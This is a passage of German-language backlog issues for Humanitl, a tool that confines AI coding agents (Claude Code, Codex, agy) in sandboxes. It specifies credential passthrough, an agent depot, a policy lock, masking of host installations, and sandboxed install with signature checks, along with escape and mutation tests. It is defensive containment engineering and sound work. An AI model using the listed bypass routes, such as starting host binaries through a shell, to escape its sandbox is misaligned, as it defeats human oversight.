  Gemini API" (install), also `generativelanguage.googleapis.com:443`,
  Kopfzeile `x-goog-api-key`, `POST /v1beta/models/{model}:generateContent`
  bzw. `:streamGenerateContent`, `GET /v1beta/models` (api-reference).
  Durchreiche: `POST` und `GET` auf `/v1beta/models` und `/v1/models` genau
  und alles darunter, an dieser einen Origin; `x-goog-api-key` ist dort
  kein Fund. `llm.endpoint` (außer der Gemini-API selbst, `is_direct_api`)
  wird `GOOGLE_GEMINI_BASE_URL` (install: „custom Gemini-compatible
  endpoint"), ohne Zugangsdaten, Query und API-Version, Loopback über den
  Alias-Namen; die Durchreiche gilt dann unter dessen Präfix.
- Hinweis HUM-516: mit Schlüssel `generativelanguage.googleapis.com`, ohne
  Schlüssel `cloudcode-pa.googleapis.com` (enterprise: „the client
  connects to the global endpoints … during sign-in, to find licenses and
  load the model catalog"); dieser Host wird gehalten, nie durchgereicht.
- Eigene Sandbox von `agy`: Linux mit „Kernel namespaces" (sandbox); wo
  unprivilegierte Nutzer-Namensräume gesperrt sind, wirken
  `enableTerminalSandbox` und `--sandbox` nicht, Auto-Modus fehlt.
  Humanitl startet mit `--disable-userns`; der Sandbox-Test belegt
  `nested_userns=refused` wie bei Codex. Das Briefing nennt Humanitl als
  äußere Grenze.
- Depot (`depot/recipe.rs`, `AGY_RECIPE`): `LoginFlow::ApiKeyOnly`,
  `update_off = AGY_CLI_DISABLE_AUTO_UPDATE=true`, keine Zugangsdatei.
  `agents login agy` antwortet `AGENT_014` mit `why` (API-Schlüssel aus dem
  Schlüsselbund von Humanitl, Schlüsselbund und Session-Bus des Hosts
  kommen nie in eine Sandbox) und neu mit `fix` `humanitl llm key set`
  (für jedes `ApiKeyOnly`). Orte einer Host-Installation unverändert
  (`/usr/bin/agy`, `/usr/local/bin/agy`, `/opt/homebrew/bin/agy`): das Skript
  kennt nur `~/.local/bin` oder `--dir`, kein npm-Paket.

Abweichungen und offen:
- **`modelProvider` nicht im Depot, sondern in der Sitzung.**
  `DepotRecipe::config_env` ist jetzt `Option`: Für `agy` verlegt keine
  Variable `~/.gemini`, also trägt das Depot nur das Programm, und die
  Einstellungen schreibt der Starter wie bei der Quelle `host` ins
  tmpfs-Home. Nach dem Review wird für ein solches Rezept keine Kopie
  angelegt und nichts unter `/run/humanitl/agent-config` eingehängt
  (`DepotMount::scratch` ist `Option`, alle Backends); der Start hält nur
  die Reservierung des Depots (`Scratch::reservation_only`). Ein
  Konfigurationslauf für `agy` antwortet `AGENT_015`, weil keine Sitzung
  lesen würde, was er schreibt. `HOME` auf die Kopie zu
  legen hätte Briefing, Skill und Vorlage des Adapters verdeckt und mit dem
  `HOME` des Wartungslaufs kollidiert. Kandidat für ein eigenes Issue: ein
  Depot-Ort relativ zu `HOME` (Kopie unter `~/.gemini/antigravity-cli`
  eingehängt), wie ADR-0023 Punkt 2 ihn nennt.
- **Kein Installationsrezept** (`install: None`, `agents install agy`
  antwortet `AGENT_015`): Das Skript holt das Manifest von
  `antigravity-cli-auto-updater-974169037036.us-central1.run.app`, das
  Programm von dem Host, den das Feld `url` des Manifests nennt, und prüft
  nur SHA-512 aus demselben Manifest, keine Signatur. Der Host des
  Programms ist erst zur Laufzeit bekannt. Unter macOS entfernt das
  Skript `com.apple.quarantine`. Messpunkt in HUM-553 Punkt 5.
- **Doku schweigt** zu: Proxy und zusätzlicher CA für den eigenen Verkehr
  der CLI (`sandboxProxy`/`certFile` gelten nur für Befehle in ihrer
  eigenen Sandbox); der Adapter setzt `SSL_CERT_FILE` (Go `crypto/x509`,
  pkg.go.dev) und verlässt sich für den Proxy auf das Env-Kit, weil das
  Skript die CLI „Go-Native" nennt — eine Ableitung, keine Zusage. Ein
  direkter Weg scheitert ohnehin geschlossen. Ebenso offen: welche
  API-Version die CLI nutzt, ob sie den Schlüssel in `x-goog-api-key` oder
  in `?key=` schickt (in der Query bliebe er ein Fund), ob sie ohne
  Schlüsselbund in eine Datei schreibt, welche Hosts die Anmeldung mit
  persönlichem Konto braucht, eine systemweite Ablage für Regeln oder
  Skills, eine Variable für den Ort von `~/.gemini`.
- **Schlüssel konfiguriert, aber nicht angekommen** (nach dem Review, gilt
  für Claude Code, Codex und `agy` an einer Stelle in `ipc`): Gibt der
  Speicher den Schlüssel nicht heraus (`LLM_009` als Warnung für eine Shell
  des Aufrufers) oder gehört er zu einem anderen Endpunkt, sieht der
  Adapter die Konfiguration ohne `llm.api_key_ref`, und der Start setzt die
  Durchreiche einer Sitzung ohne Schlüssel an die Stelle der installierten
  (`Inner::passthrough_without_key`). Für `agy` heißt das: keine
  Durchreiche zur Gemini-API, kein `modelProvider` in der Vorlage; für
  Codex der eingebaute Anbieter; für Claude Code bleibt die Durchreiche
  gleich, weil sie nicht vom Schlüssel abhängt.
- **Ohne Schlüssel** startet `agy` mit der Anmeldung über ein Google-Konto,
  findet in der Sandbox keinen Schlüsselbund und meldet das selbst
  (troubleshooting: „secret keyring is locked"); kein eigener Befund von
  Humanitl, weil das Verhalten von `agy` ohne Schlüsselbund nicht belegt
  ist.
- Kein Ende-zu-Ende-Lauf mit dem echten `agy` (nicht installiert, nicht
  quelloffen); belegt ist der Weg mit dem Stellvertreter-Programm im
  echten bwrap, der echte Lauf steht in HUM-553 Punkt 5.
- Wie bei Claude Code und Codex: Eine Shell des Aufrufers (`humanitl run --
  bash`), die `agy` von Hand startet, bekommt weder Einstellungen noch
  Schlüssel; der Starter gilt nur dem Agenten. Der Shim startet `/bin/sh`,
  ein fehlendes Programm endet mit 127 der Shell; die Vorprüfung
  (`AGENT_001`) fängt den Fall vorher.
- Unter macOS nicht gegengeprüft; die Pfade liegen dort gleich unter
  `HOME`.

Tests: `daemon/crates/sandbox/tests/agy_adapter.rs` (Register, Kommando,
Env-Kit, Basis-URL eines Gateways, Direktprüfung, Vorlage der
Einstellungen, Starter mit und ohne Schlüssel, Dateien, Briefing,
Durchreiche, Hinweis, Vorprüfung, Rezept, `agents login agy` mit
`AGENT_014` und `fix`, Konfigurationslauf mit `AGENT_015`, und im echten
bwrap ein Stellvertreter hinter dem Starter neben einem gefälschten
Host-Home mit `~/.gemini` (Einstellungen, `oauth_creds.json`, `GEMINI.md`),
`~/.config/Antigravity`, einer Schlüsselbund-Datei und einem gefälschten
Bus-Socket im gefälschten Laufzeitordner: Schlüssel in der Umgebung, nicht
in `argv` oder der Umgebung des Plans, Einstellungen mit
`modelProvider` und schreibbar, Updater aus, CA lesbar, Briefing und Skill
da, kein `DBUS_SESSION_BUS_ADDRESS`, kein Bus-Socket, Markierung des
Host-Logins nirgends unter `/home`, `/etc`, `/tmp`, `/work`, `/run`,
Vorlage und Schlüsseldatei nur lesbar, verschachtelter Nutzer-Namensraum
abgelehnt), `ipc` (Schlüssel als Datei und über den Starter, Maske
`x-goog-api-key` an `generativelanguage.googleapis.com:443`, Durchreiche),
Widget-Test der Wahl in den Einstellungen und Breitentest mit sechs
Agenten (en und de, Linux und macOS, kein Überlauf bei kleinster
Fenstergröße; die Wahl bleibt einzeilig, rund 450 Pixel bleiben frei,
Mutation: zehnfache Beschriftung „Antigravity" läuft um 113 Pixel über,
alle vier Fälle rot). Angepasst: drei Tests, die `agy`
als Agenten ohne Rezept nahmen, nehmen jetzt `pi`. Mutationsbeweise, jeder
rot: Host-Login (`oauth_creds.json` aus dem gefälschten Host-Home) als
Datei in `~/.gemini` der Sandbox (`host_login=absent`), `SSL_CERT_FILE`
aus der Umgebung des Adapters entfernt (Env-Kit-Test; das Profil trägt
`SSL_CERT_FILE` zusätzlich), Schlüssel als Wort des Starters (Starter- und
Sandbox-Test), `DBUS_SESSION_BUS_ADDRESS` in der Umgebung des Adapters
(Env-Kit- und Sandbox-Test), der gefälschte Bus-Socket als nur lesbare
Einhängung im Profil (Plan scheitert mit `SANDBOX_006`, Laufzeitordner).
Docs: README-Liste der Agenten, SECURITY (Fund, en, de), THREAT-MODEL
K-02 und Änderungszeile (en, de).

---

## HUM-518 · Agent-Depot: Kern, `agents.source`, Sperre durch Firmenvorgabe, RPC und CLI `status`, `source`, `remove`

### Kontext
Entscheidung in [ADR-0023](../docs/adr/0023-agent-depot.md), Wunsch des
Owners vom 2026-11-16 (BACKLOG Abschnitt 9, Punkt 23): Agenten wie Claude
Code sollen nicht auf dem Host installiert werden müssen. Ein Depot je
Agent unter dem Datenordner des Daemons hält Programm, Konfiguration und
Anmeldung; jede Sandbox nimmt sie von dort. Dieses Issue baut den Kern:
Ablage, Auswahl der Quelle, Einhängen in die Sitzung, Status, Entfernen.
Installation (HUM-519) und Anmeldung (HUM-520) kommen danach; bis dahin
füllen die Tests das Depot von Hand.

### Spezifikation
0. Ohne Opt-in ändert sich nichts: `agents.source = "host"` ist Vorgabe,
   der Adapter findet das Programm wie heute (HUM-278).
1. **Konfiguration**, alle `x-project-scope = denied`, mit Schema,
   `docs/CONFIG.md` und Schnappschüssen: `agents.source` (`host`, `depot`),
   `agents.<id>.source` je bekanntem Adapter (`opencode`, `pi`, `claude`,
   `codex`, `agy`; ungesetzt gilt `agents.source`),
   `agents.<id>.credential_writeback` (Vorgabe `true`, wirkt ab HUM-520).
   Neuer Abschnitt `agents` neben dem bestehenden `agent` (der den Adapter
   wählt); der Unterschied steht in `backlog/CONVENTIONS.md` Abschnitt 4.
2. **Sperre:** Ein Auflöser `effective_source(adapter, config, lock)` gibt
   Quelle, Herkunft und gegebenenfalls `Locked { by }` zurück. Die Sperre
   kommt später aus der Firmen-Vorgabedatei (BACKLOG Abschnitt 9, Punkt 21)
   und darf nur `depot` nennen; bis dahin ist sie ein Parameter, den die
   Tests setzen. Gesperrt auf `depot` lehnt der Start mit Quelle `host`
   ab (`AGENT_010`, `why` nennt die Vorgabe als Quelle, kein `fix` zum
   Umgehen). Die Sperre gilt für jeden Schreibweg der Einstellung gleich:
   `humanitl agents source <id> host`, `humanitl config set
   agents.<id>.source host` bzw. `agents.source host`, die generische
   Einstellungszeile und `ChangeSetting` werden abgelehnt.
3. **Jeder Startweg folgt der Quelle** (ADR-0023 Punkt 1). Mit `depot`,
   und unter der Sperre immer, kommt das Programm aus dem Depot, egal ob
   die Sitzung über `humanitl go`, `humanitl run`, die App, `agent.command`
   oder ein Kommando hinter `humanitl run --` startet. Ein solches
   Kommando darf Argumente anhängen und das Depot-Programm beim Namen
   nennen; ein Pfad auf dem Host oder ein Programm des Hosts, das ein
   Adapter als seinen Agenten erkennt (`claude`, `codex`, `agy`, auch über
   einen Wrapper-Pfad oder einen Symlink darauf), wird mit `AGENT_017`
   abgelehnt. Unter der Sperre gilt das für jeden Adapter ohne Ausnahme;
   ohne Sperre und mit `host` bleibt alles wie heute.
   **Ein Wächter für alle Startwege:** Heute entsteht das Kommando auf
   getrennten Wegen (`plan_configured_agent` für das konfigurierte
   Programm neben einem Kommando des Aufrufers,
   `bind_agent_program` für das Kommando des Adapters, aufgerufen in
   `daemon/crates/ipc/src/sandbox.rs` um Zeile 4030 und in
   `daemon/bin/humanitl/src/cmd/sandbox.rs` um Zeile 1350). Der Wächter
   prüft deshalb nicht dort, sondern das endgültige Kommando und die
   Einhängungen, die die Sandbox bekommt (`PlanRequest`), im Sandbox-Crate
   in einer gemeinsamen Funktion, die jeder `SandboxBackend::plan` als
   Erstes ruft (Muster wie `refuse_stream`). Danach löst kein Startweg
   mehr ein Programm auf oder hängt eines ein. Nicht in App oder CLI.
4. **Bekannte Host-Installationen maskiert.** Eine Startprüfung hält
   keine Shell auf: das Standardprofil hängt `/usr` des Hosts nur lesbar
   ein (`profiles/sandbox/default.toml`, `[mounts] ro`), also erreichte
   `humanitl run -- /bin/sh -c /usr/bin/claude` eine Installation dort.
   Mit `depot`, und unter der Sperre immer, legt der Launcher über jeden
   Ort, den das Rezept des Adapters als Host-Installation nennt (Claude
   Code: `/usr/bin/claude`, `/usr/local/bin/claude`,
   `/usr/lib/node_modules/@anthropic-ai/claude-code`; Codex und `agy` in
   HUM-515 und HUM-517 belegen), eine leere, nur lesbare Einhängung; das
   Heimatverzeichnis des Hosts ist ohnehin nicht eingehängt (im Test
   nachweisen). Maskiert werden nur Orte, die auf dem Host bestehen; ein
   fehlender wird übersprungen, weil dort nichts zu erreichen ist und bwrap
   unter dem nur lesbaren `/usr` keinen Einhängepunkt anlegen kann
   (`EROFS`, `daemon/crates/sandbox/src/bwrap_args.rs` um Zeile 38).
   Seatbelt (macOS) kennt keine Einhängungen: dort sind die Masken
   ausdrückliche Verbotsregeln `file-read*` und `process-exec` für
   dieselben Pfade im Profil, hinter der Regel, die Lesen außerhalb der
   privaten Bäume erlaubt (`daemon/crates/sandbox/src/seatbelt.rs` um
   Zeile 409), denn in SBPL gewinnt die letzte passende Regel.
   Grenze, ausdrücklich: Die Sperre verhindert, dass
   Humanitl einen Agenten des Hosts startet oder in die Sandbox bringt;
   gegen einen Nutzer, der ein Agentenprogramm absichtlich an einen
   ungelisteten Ort kopiert, schützt sie nicht, auf seinem eigenen Rechner
   bestimmt er das.
5. **Ablage** unter `$XDG_DATA_HOME/humanitl/agents/<id>/`, Ordner `0700`,
   Dateien `0600` bzw. `0700` für Programme, Besitzer der Nutzer des
   Daemons: `program/<version>/` mit `manifest.json` (Version, Quelle,
   SHA-256 je Datei, Signaturergebnis, Zeit), Verweis `current`,
   `config/`, `credentials/`. Modul im Sandbox-Crate unter
   `daemon/crates/sandbox/src/agent/depot/`, Pfade über
   `humanitl_config::paths`. Beim Öffnen prüft der Daemon Besitzer, Rechte
   und dass kein Pfadteil ein Symlink nach außen ist; sonst Befund.
6. **Einhängen:** Mit Quelle `depot` baut der Daemon den `LaunchPlan` so:
   `program/<version>/` (aufgelöst, nie `current`) nur lesbar unter
   `/run/humanitl/agent/`. Das ist eine neue Einhängeart nur des Daemons
   neben `AgentProgram` (eine reguläre Datei, HUM-278): ein Ordner, vor
   jedem Einhängen mit den Vertrauensregeln aus `locate.rs` (`Trust`:
   Besitzer, kein Schreibrecht für andere, kein Symlink aus dem Baum)
   für jeden Eintrag des Versionsordners geprüft; kein Adapter kann sie
   hinzufügen. Der Modulkommentar von `locate.rs` („one regular file,
   never a directory") wird im selben Commit um diese zweite Art ergänzt.
   `config/` und die Zugangsdatei werden in einen
   Arbeitsordner der Sitzung kopiert (unter dem Laufzeitordner der
   Sitzung, Obergrenze 64 MiB, darüber Befund) und schreibbar als
   Konfigurationsordner des Agenten eingehängt, weil Agenten ihren
   Konfigurationsordner laufend schreiben (Claude Code `.claude.json`);
   am Ende der Sitzung wird der Arbeitsordner gelöscht, auch nach einem
   Absturz beim nächsten Start des Daemons. Zusage: nichts, was eine
   Sitzung schreibt, bleibt im Depot, außer der geprüften Zugangsdatei
   (HUM-520). Innerhalb der eigenen Sitzung darf der Agent seine Kopie
   ändern. Backend-neutral über die vorhandenen Einhängearten des
   Plans; bwrap, Podman, `qemu` und Seatbelt (Pfadregeln) tragen es gleich.
   Neue Adapter-Angaben im `AgentAdapter`, alle optional: Name des
   Programms im Depot, Umgebungsvariable des Konfigurationsordners
   (`CLAUDE_CONFIG_DIR`, `CODEX_HOME`, …), Schalter gegen Selbst-Update.
   Ein Adapter ohne diese Angaben kennt nur `host`; `depot` meldet dann
   einen Befund. Ausdrücklich: `agents.opencode.source` und
   `agents.pi.source` sind gültige Schlüssel (das Schema kennt alle fünf
   Adapter), aber bis ein Issue für OpenCode bzw. pi ein Rezept liefert,
   ergibt `depot` für sie beim Laden einen Hinweis und beim Start
   `AGENT_015`.
7. **Nie auf dem Host ausführen:** Weder Vorprüfung noch Doctor noch
   Status starten etwas aus dem Depot; die Version kommt aus
   `manifest.json`.
8. **RPC** `Agents` (ADR-018, Muster wie `Egress`): Status aller Agenten
   (wirksame Quelle mit Herkunft und Sperre, installierte Version,
   Signatur, angemeldet ja/nein, letzte Rückschrift, Größe), Quelle setzen,
   Depot entfernen. Protokoll-Minor +1, `docs/PROTOCOL.md`.
9. **CLI:** `humanitl agents status [<id>] [--json]`,
   `humanitl agents source <id> host|depot`, `humanitl agents remove <id>`
   (fragt nach, `--yes`; verweigert, solange eine Sitzung das Depot nutzt;
   ändert die Quelle nicht, eine Sitzung mit `depot` meldet danach
   „nicht installiert"). Zeile in der Paritätstabelle.
10. **Doctor:** eine Zeile je Agent mit Quelle `depot`: Version, angemeldet,
   oder was fehlt.
11. **Befunde** (registriert in `codes.rs` und `docs/DIAGNOSTICS.md`,
   Bereich `AGENT` wächst von 001-007 auf 001-029; die Liste der Codes in
   `backlog/CONVENTIONS.md` Abschnitt 4.17 (Agent-Adapter, HUM-037) wird im
   selben Commit nachgeführt): `AGENT_008` Agent nicht
   im Depot installiert (`fix`: `humanitl agents install <id>`),
   `AGENT_009` nicht angemeldet (`fix`: `humanitl agents login <id>`, ab
   HUM-520), `AGENT_010` Quelle durch Vorgabe festgelegt, `AGENT_013`
   Depot unbrauchbar (Besitzer, Rechte, Symlink, Größe), `AGENT_015`
   Adapter oder Backend kennt das Depot nicht, `AGENT_017` Kommando nennt
   ein Programm des Hosts, obwohl die Quelle `depot` ist oder gesperrt.
   `AGENT_011`, `AGENT_012`,
   `AGENT_014` und `AGENT_016` registrieren HUM-519 und HUM-520.

### Tests
- Auflöser: Vorgabe `host`; `agents.source = "depot"` gilt für alle,
  `agents.<id>.source` gewinnt; Sperre schlägt beides; Sperre auf `host`
  wird abgelehnt.
- Projekt-Profil mit `agents.*` wird beim Laden abgelehnt.
- Unter Sperre: `agents source claude host`, `config set
  agents.claude.source host`, `config set agents.source host` und
  `ChangeSetting` über RPC werden abgelehnt, die Datei bleibt unverändert.
- Ein Wächter für alle Wege: je ein Test für das konfigurierte Programm,
  `agent.command`, `run --` über den Daemon (`ipc/src/sandbox.rs`), den
  Startweg der CLI (`cmd/sandbox.rs`) und den Start aus der App über den
  RPC; jeder endet mit `Depot`-Programm bzw. `AGENT_017`.
- Unter Sperre mit einem Stellvertreter-`claude` unter `/usr/local/bin`
  des Testsystems (bzw. einem Profil, das den Ort einhängt): in der
  Sandbox ist der maskierte Ort leer, `run -- /bin/sh -c
  /usr/local/bin/claude` findet nichts; `$HOME` des Hosts ist nicht
  sichtbar. Mutationsbeweis: Maske entfernt färbt den Test rot.
- Ein Ort aus dem Rezept, der auf dem Host fehlt, wird übersprungen: der
  Plan enthält für ihn keine Einhängung, die Sitzung startet (kein
  `EROFS`). Mutationsbeweis: Prüfung auf Bestehen entfernt färbt den Test
  rot.
- macOS (CI-Job `macos`): das Seatbelt-Profil einer Depot-Sitzung enthält
  `deny file-read*` und `deny process-exec` für die Orte des Rezepts
  hinter der allgemeinen Leseregel; eine Depot-Sitzung kann ein
  Stellvertreter-`/usr/local/bin/claude` des Hosts weder lesen noch
  starten. Mutationsbeweis: Verbotsregel vor die Leseregel gestellt
  oder entfernt färbt den Test rot.
- Startwege mit `depot`: `agent.command = ["/home/u/.local/bin/claude"]`,
  `humanitl run -- /usr/local/bin/claude`, ein Symlink `~/bin/c` auf ein
  Host-`claude` und `run -- codex` mit Host-`codex` im `PATH` ergeben
  `AGENT_017`; `agent.command = ["claude", "--model", "x"]` startet das
  Depot-Programm mit den Argumenten. Unter Sperre dasselbe auch mit
  `agents.claude.source = "host"` in einer Ebene unter der Sperre.
- `agents.opencode.source = "depot"` lädt, der Start meldet `AGENT_015`.
- Mit `sandbox.backend = "bwrap"` und `sandbox.min_isolation` auf
  Vorgabe startet eine Depot-Sitzung; das Depot verlangt keine
  Kernel-Stufe.
- Plan mit Quelle `depot`: Programmordner nur lesbar, aufgelöste Version
  statt `current`, Arbeitsordner schreibbar, Arbeitsordner nach dem Ende
  weg; mit Quelle `host` ist der Plan Byte für Byte der von heute
  (Schnappschuss).
- In der Sandbox (bwrap, Escape-Suite-Muster): Schreiben in den
  Programmordner scheitert; eine Datei im Arbeitsordner erscheint nicht im
  Depot; die Socket-Prüfung aus `README.md` zeigt weiter genau eine Zeile.
- Depot mit fremdem Besitzer, `0755` oder Symlink nach `/home` ergibt
  `AGENT_013`.
- Kein Prozess startet aus dem Depot auf dem Host: Test mit einem
  Programm im Depot, das beim Start eine Markerdatei schreibt, nach Status,
  Doctor und Vorprüfung fehlt die Markerdatei.
- RPC und CLI: `status --json`, `source`, `remove` (mit laufender Sitzung
  abgelehnt).
- Mutationsbeweise: `current` statt aufgelöster Version eingehängt färbt
  den Plantest rot; Programmordner schreibbar färbt den Sandbox-Test rot;
  Sperre ignoriert färbt den Auflösertest rot; der gemeinsame Wächter
  nur in einem der Backends gerufen färbt die Startweg-Tests rot; die Sperre nur in `agents source`, nicht in `config set`, färbt den
  Test zu `config set` rot.

### Fallstricke
- `agent` und `agents` sind zwei Abschnitte; keine Umbenennung des
  bestehenden `agent.*`, sonst brechen Konfigurationen.
- Den Arbeitsordner nie unter `config/` des Depots anlegen, sonst landet
  ein Schreiben der Sitzung doch im Depot.
- Unter der Kernel-Stufe ist der Arbeitsordner eine virtiofs-Freigabe; sie
  darf nicht das Depot selbst freigeben.
- macOS: die Seatbelt-Regel für den Programmordner nur `file-read*`; den
  CI-Job `macos` grün halten, Linux-Teile mit `cfg` abgrenzen.
- `codes.rs`, `fake_daemon_client.dart` und ARB sind gemeinsam genutzte
  Dateien (CLAUDE.md).

### Akzeptanzkriterien
1. Ohne `agents.*` startet jede Sitzung wie vorher.
2. Mit `depot` startet der Agent aus dem Depot, sein Programm ist in der
   Sitzung nicht änderbar, und nichts, was die Sitzung schreibt, bleibt im
   Depot (die Zugangsdatei regelt HUM-520).
3. Eine Sperre auf `depot` lässt keinen Agenten vom Host starten, über
   keinen Startweg (`go`, `run`, `run --`, `agent.command`, App), und
   keinen Schreibweg der Einstellung zurück auf `host`; App und CLI nennen
   die Vorgabe als Grund.
4. Das Depot funktioniert auf der gemeinsamen Stufe mit bwrap;
   `sandbox.min_isolation` bleibt unverändert.
5. Kein Programm aus dem Depot läuft je außerhalb einer Sandbox.
6. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` (en und de) nennen das
   Depot als Herkunft des Agenten, die Einhängungen, die Masken (leere
   Einhängungen unter Linux nur für bestehende Orte, Verbotsregeln unter
   Seatbelt) und die Grenze der Sperre aus Punkt 4 wörtlich (neuer Eintrag K-36, erster
   Teil); die drei Garantien und `tests/escape/` bleiben
   unverändert grün.


### Stand nach der Umsetzung (2026-11-17)

Konfiguration `agents.source` und `agents.<id>.source` (Vorgabe `host`),
Auflösung mit Herkunft und Sperre; die Sperre der Firmenvorgabe ist eine
Eingabe des Auflösers (`SourceLock::of_policy`), die Tests setzen, und
greift auf jedem Schreibweg (`agents source`, `config set`, SetConfig,
ChangeSetting, Einstellungszeile). Depot-Kern in
`sandbox/src/agent/depot/` (Rezepte, Ablage, Prüfung des Versionsordners
samt harter Links, Wegwerfkopie je Sitzung, Wächter). Ein Wächter
(`AGENT_017`) steht vor jedem `SandboxBackend::plan` und prüft Befehl,
Programm und jede eingebundene Quelle, die einen Host-Ort an einen anderen
Pfad hängt; bwrap prüft nach dem Festhalten der Deskriptoren noch einmal,
Podman lehnt verschobene Quellen über symbolische Links ab. Verdeckt
werden die Host-Installationen jedes Agenten auf `depot` oder unter der
Sperre (Linux leere Einhängungen nur für vorhandene Orte, Seatbelt
Verbotsregeln hinter der Leseregel). Eine Reservierung je Agent (`flock`)
hält ein Start bis zum wirklichen Ende der Sandbox, `remove` exklusiv
(`AGENT_018`). RPC `Agents`, CLI `humanitl agents status|source|remove`,
Zeilen in `doctor`, Protokoll 1.44. Ein neuer Agent braucht einen Eintrag
in `recipe.rs` und eine Zeile im Makro `known_agents!`. SECURITY und K-36
(en und de) nennen Herkunft, Einhängungen, Verdeckungen und die Grenzen
(Sperre gegen absichtlich kopierte Programme, Pfadfenster bei Podman).
Abweichung: Mit dem Kernel-Level lehnt Humanitl eine Depot-Sitzung vorerst
mit `AGENT_015` ab, weil die beschreibbare Kopie dort eine eigene Freigabe
braucht (Kandidat für ein eigenes Issue).

Review: Codex Runde 1 drei blocking (Host-Installation über
`--tests-dir`, Codex und agy ohne Verdeckung, harte Links in den
Programmordner) und zwei major (`remove` gegen Start, Link oberhalb des
Depots, letzterer auf minor herabgestuft), alle behoben; Delta ein
blocking (Wettlauf zwischen Prüfung und Festhalten) und ein major
(Reservierung endet vor dem Container), beide behoben. Sonnet als Ersatz
für Antigravity kein blocking oder major; drei minor übernommen (eine
Liste weniger und Makro für neue Agenten, Nachweis für AC5, Leerzeichen
im Sperrvergleich).

---

## HUM-519 · Agent-Depot: Installation und Update in einer Wartungs-Sandbox, Version angeheftet

### Kontext
ADR-0023 Punkt 5. Installation und Update laufen nie auf dem Host, sondern
in einer gewöhnlichen Humanitl-Sandbox ohne Projekt und ohne Daten des
Hosts; das Netz geht nur durch Humanitl, mit Regeln für die Paket- und
Download-Hosts des Agenten.

### Spezifikation
1. **Wartungslauf** als Sitzungsart `DepotMaintenance { agent, task }`:
   kein `/work`, `HOME` ein Arbeitsordner, Netz nur über den Proxy, das
   gewählte Backend, Briefing aus. Der Lauf hat ein Terminal wie jede
   Sitzung, App und CLI hängen sich an.
2. **Adapter-Angaben** (optional im `AgentAdapter`): Installationsrezept
   (Kommando in der Sandbox, abhängig von Version), Liste der Hosts für
   Installation und Update (genau, keine Platzhalter außer wo der Anbieter
   sie nötig macht, mit Beleg), wo das Programm nach dem Lauf liegt,
   Signaturprüfung, falls der Anbieter signiert. Die Hosts werden zu
   Regeln `allow` nur dieser Sitzung; alles andere wird gehalten.
3. **Version angeheftet:** `install` nimmt die angegebene Version oder die
   aktuelle des Anbieters und schreibt sie fest; nur `update` ändert sie.
   Sitzungen schalten das Selbst-Update ab (Angabe aus HUM-518) und
   finden den Programmordner nur lesbar.
4. **Übernahme** nach einem erfolgreichen Lauf: Der Daemon prüft den Baum
   (nur reguläre Dateien, Ordner, relative Symlinks innerhalb; keine
   Sockets, FIFOs, Geräte, harten Links, Set-UID/Set-GID; Obergrenze für
   Größe und Dateizahl), berechnet SHA-256 je Datei, schreibt
   `manifest.json`, verschiebt nach `program/<version>/` und setzt
   `current` atomar um. Ein gescheiterter Lauf ändert nichts am Depot.
5. **Signatur:** Wo der Anbieter signiert (Claude Code: `manifest.json` mit
   Schlüssel `31DD DE24 DDFA B679 F42D 7BD2 BAA9 29FF 1A7E CACE`,
   code.claude.com/docs/en/setup), prüft der Lauf in der Sandbox mit `gpg`
   aus dem `/usr` des Hosts gegen den im Adapter festen Fingerabdruck und
   die SHA-256 des Programms gegen das Manifest; das Ergebnis steht in
   `manifest.json`. Keine eigene Kryptographie im Daemon. Wo der Adapter
   eine Signatur angibt, schlägt der Lauf geschlossen fehl: fehlt `gpg` im
   `/usr` des Hosts, endet `gpg` mit Fehler, oder fehlt die Zeile mit dem
   erwarteten Fingerabdruck in der Ausgabe, gibt es `AGENT_011` und nichts
   wird übernommen, nie eine unsignierte Übernahme.
6. **Update:** neue Version in einen eigenen Ordner, dann `current`
   umsetzen; laufende Sitzungen behalten ihre Version. Alte Versionen
   räumt der Daemon, wenn keine Sitzung sie nutzt; die vorige bleibt für
   ein Zurück (`agents update <id> --version <alt>`).
7. **RPC** zum Starten von Installation und Update (gibt die Sitzung
   zurück), **CLI** `humanitl agents install <id> [--version V]` und
   `humanitl agents update <id> [--version V]`, beide hängen sich an das
   Terminal des Laufs; mit `--yes` ohne Rückfrage.
8. **Befunde:** `AGENT_011` Installation oder Update gescheitert (Download,
   Signatur, Prüfsumme, unzulässige Datei im Baum, Obergrenze), mit dem
   Schritt im `why`.
9. Vor dem Bau je Adapter mit Depot-Angaben die Hosts und das Rezept an der
   offiziellen Doku belegen und im Code verlinken (Stand 2026-11-16 für
   Claude Code: `claude.ai/install.sh`, `downloads.claude.ai`; Codex und
   `agy` offen, HUM-515, HUM-517).

### Tests
- Mit einem Stellvertreter-Adapter und einem Download-Server im Test:
  Installation landet in `program/<version>/`, `manifest.json` stimmt,
  `current` zeigt darauf.
- Ein Baum mit Socket, FIFO, Set-UID-Datei, Symlink nach `/etc` oder einem
  harten Link wird abgelehnt (`AGENT_011`), das Depot bleibt wie vorher.
- Ein Host außerhalb der Liste wird im Lauf gehalten, nicht erlaubt.
- Signatur falsch oder Prüfsumme falsch: Abbruch, nichts übernommen.
- `gpg` fehlt in der Sandbox (Test mit leerem `PATH` für `gpg`), `gpg`
  endet mit Status ungleich 0, oder der Fingerabdruck in der Ausgabe ist
  ein anderer: jeweils `AGENT_011`, Depot unverändert. Mutationsbeweis:
  fehlendes `gpg` als „nicht geprüft" statt Fehler gewertet färbt den Test
  rot.
- Update während einer laufenden Sitzung: die Sitzung sieht die alte
  Version weiter; neue Sitzung die neue.
- Selbst-Update in der Sitzung scheitert am nur lesbaren Ordner.
- Mutationsbeweise: Prüfung des Baums auf Sockets entfernt färbt den
  Socket-Test rot; Regel aus der Wartungssitzung in die globalen Regeln
  geschrieben färbt den Test „Host außerhalb wird gehalten" in der
  Folgesitzung rot.

### Fallstricke
- Der native Installer von Claude Code legt einen Starter unter
  `~/.local/bin` und Versionen unter `~/.local/share/claude/versions/` an;
  übernommen wird nur die Versionsdatei, nicht der Starter.
- Die Regeln des Laufs sind Sitzungsregeln; sie dürfen die gespeicherten
  Regeln nie berühren.
- Ein Installer, der `sudo` will oder ins `/usr` schreibt, scheitert in
  der Sandbox; das ist richtig, die Meldung sagt es.

### Akzeptanzkriterien
1. Ein Agent lässt sich installieren und aktualisieren, ohne dass auf dem
   Host etwas außerhalb des Depots geschrieben oder ausgeführt wird.
2. Jede Anfrage des Laufs geht durch Humanitl und steht in der
   Aufzeichnung; nur die Hosts des Adapters gehen ohne Halt.
3. Die Version ändert sich nur über `update`.
4. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` (K-36) nennen
   Wartungsläufe, Signaturprüfung und Anheften im selben Commit.

